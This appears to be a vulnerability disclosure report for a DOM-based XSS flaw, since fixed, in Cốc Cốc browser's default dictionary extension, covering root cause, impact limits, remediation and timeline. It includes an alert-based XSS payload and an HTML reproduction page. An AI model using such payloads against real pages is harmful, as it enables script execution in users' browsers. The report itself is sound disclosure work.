# DOM-based XSS in Cốc Cốc "Dictionary & Translate" Extension — Via Unsanitized Text Selection

[Canonical published article](https://namvuvan-research.github.io/posts/coccoc-dom-xss/) · [Vietnamese translation](README.vi.md)

The published article is the primary reference; this repository preserves the report and supporting material.

## Summary
A DOM-based XSS vulnerability was identified in the default "Dictionary & Translate" (Từ điển và Dịch) extension bundled with Cốc Cốc browser. When a user highlights text containing HTML/JavaScript inside a `<textarea>` element, the extension renders the selected content as raw HTML instead of plain text, causing the browser to execute arbitrary JavaScript in the context of the current page. The vulnerability has been fixed by the Cốc Cốc team.

## Vulnerability Details
| Field         | Detail                                                        |
|---------------|---------------------------------------------------------------|
| Type          | DOM-based XSS                                                 |
| Severity | Medium (reported assessment; CVSS vector and vendor rating not documented) |
| Product       | Cốc Cốc Browser — "Dictionary & Translate" Extension (default)|
| Attack Vector | Malicious page with pre-filled `<textarea>` → user highlights text → XSS triggered |
| Status        | Fixed                                                         |
| Bounty        | None                                                          |

## Root Cause
The "Dictionary & Translate" extension listens for text selection events to provide translation popups. When the user highlights text inside a `<textarea>`, the extension extracts the selected content and renders it as raw HTML into the DOM without sanitization or encoding. If the selected text contains HTML tags with JavaScript event handlers (e.g., `<img src=x onerror=...>`), the browser parses and executes them in the security context of the current webpage.

## Proof of Concept

### Prerequisites
- Cốc Cốc browser with the default "Dictionary & Translate" extension enabled.

### Steps to Reproduce
1. Open any webpage containing a `<textarea>` element, or create a local HTML file for testing.
2. Enter the following payload inside the `<textarea>`:
   ```
   <img src=x onerror=alert('XSS_SUCCESS_DOMAIN:'+document.domain)>
   ```
3. Highlight (select) the payload text inside the `<textarea>`.
4. An alert box appears displaying the current `document.domain`, confirming JavaScript execution in the page's security context.

### Payload
```html
<img src=x onerror=alert('XSS_SUCCESS_DOMAIN:'+document.domain)>
```

### Reproduction Code
The following HTML file can be used to reproduce the vulnerability. It can also be tested directly on [JSFiddle](https://jsfiddle.net/).

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC CocCoc Extension XSS</title>
</head>
<body>
    <h3>XSS PoC — Cốc Cốc Dictionary Extension</h3>
    <p>Step 1: Copy the payload below:</p>
    <div style="background:#f0f0f0;padding:10px;font-family:monospace;border:1px dashed #333;">
        &lt;img src=x onerror=alert('XSS_SUCCESS_DOMAIN:'+document.domain)&gt;
    </div>
    <br>
    <p>Step 2: Paste it into the textarea below, then <b>highlight</b> the text:</p>
    <textarea style="width:100%;height:100px;font-size:18px;" 
              placeholder="Paste payload here and highlight..."></textarea>
    <p><i>If an alert popup appears when highlighting, the vulnerability is confirmed.</i></p>
</body>
</html>
```

### Result

![poc_coccoc_xss](./images/poc_coccoc_xss.png)

*Figure 1: XSS triggered when highlighting text in `<textarea>` — alert displays `document.domain` confirming execution in page context*

> **Note:** The original video PoC demonstrating the full exploitation flow is no longer available. The report records that subsequent retesting no longer reproduced the issue; the exact fixed version is not documented.

## Impact

**Observed behavior:** JavaScript executed in the origin of the page containing the selected text after the extension processed that text as HTML.

**Evidence limits:** The PoC does not establish session hijacking, cross-origin execution, or access to privileged extension capabilities. HttpOnly cookies are not readable through document.cookie. If the attacker already controls the page containing the payload, further evidence is needed to establish what additional execution capability the flaw provides.

**Scope:** Affected browser and extension versions are not documented in the public report. The result should not be generalized to every installation. Medium is the recorded assessment; a CVSS vector and vendor-confirmed rating are not documented.

## Remediation

**Immediate Fix:** The extension should treat all selected text as plain text. When extracting text selection for the translation popup, use `textContent` or equivalent plain-text methods instead of rendering raw HTML. Any content inserted into the DOM should be sanitized with DOMPurify or encoded via `createTextNode()`.

**Long-term Architectural Recommendation:** Browser extensions that process user-selected content should never render it as HTML. All user-controllable data passing through an extension's content script must be treated as untrusted input, regardless of the source element. Additionally, the extension should implement a strict Content Security Policy to prevent inline script execution.

## Timeline
| Date            | Event                                              |
|-----------------|----------------------------------------------------|
| Dec 30, 2025    | Vulnerability discovered                           |
| Dec 30, 2025    | Report sent to secure@ and hotro@ (incorrect addresses) |
| Dec 31, 2025    | Report resent to coccoc@coccoc.com and via Facebook |
| Dec 31, 2025    | Cốc Cốc acknowledged receipt via Facebook and forwarded to dev team |
| Jan–Mar 2026    | No longer reproduced in subsequent retesting (exact version not documented)              |
| Mar 2026        | Public disclosure                                  |

## Acknowledgment
Thanks to the Cốc Cốc technical support team for acknowledging the report and coordinating the fix.

![coccoc_fb_chat_1](./images/coccoc_fb_chat_1.png)

*Figure 2: Initial contact with Cốc Cốc support via Facebook*

![coccoc_fb_chat_2](./images/coccoc_fb_chat_2.png)

*Figure 3: Cốc Cốc confirmed receipt and forwarded to development team*

